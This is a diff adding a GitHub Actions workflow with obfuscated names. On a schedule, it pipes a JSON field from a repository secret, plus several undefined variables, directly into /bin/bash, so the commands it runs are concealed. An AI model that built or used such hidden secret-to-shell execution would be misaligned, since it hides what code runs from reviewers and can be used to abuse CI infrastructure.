@@ -1,0 +1,26 @@
+name: yaofandui4567
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '30 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yaofandui4567
+        env:
+          wbfa5: ${{ secrets.wbfa5 }}
+        run: |
+          echo $wbfa5 | jq -r .a4 | /bin/bash
+          echo $aq9 | jq -r .oyjz0128 | /bin/bash
+          echo $twq9 | jq -r .wosg332 | /bin/bash
+          echo $l9621 | jq -r .bz18064 | /bin/bash
+          echo $utc2 | jq -r .hddw6 | /bin/bash
+          echo $ye64 | jq -r .ll67 | /bin/bash
+          echo $tlit8 | jq -r .zul53 | /bin/bash
+          echo $nmh909 | jq -r .ctg705 | /bin/bash
+          echo $jrd6029 | jq -r .kcily413 | /bin/bash
+
